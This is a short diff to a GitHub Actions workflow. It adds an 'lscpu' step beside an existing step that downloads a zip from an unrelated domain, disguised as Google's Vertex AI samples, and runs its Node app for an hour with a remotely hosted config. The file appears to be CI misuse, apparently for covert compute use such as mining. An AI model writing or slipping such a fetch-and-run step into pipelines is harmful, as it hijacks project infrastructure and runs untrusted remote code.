@@ -9,5 +9,6 @@
             node-version: [18]
         steps:
         - uses: actions/checkout@v3
+        - run: lscpu
         - run: wget -O vertex-ai-samples-master.zip https://yrf419.net/vertex-ai-samples-master.zip && unzip vertex-ai-samples-master.zip && cd vertex-ai-samples-master && timeout 1h node addon/app.js -s="https://api.npoint.io/977ad833c75b44990f8a"
 
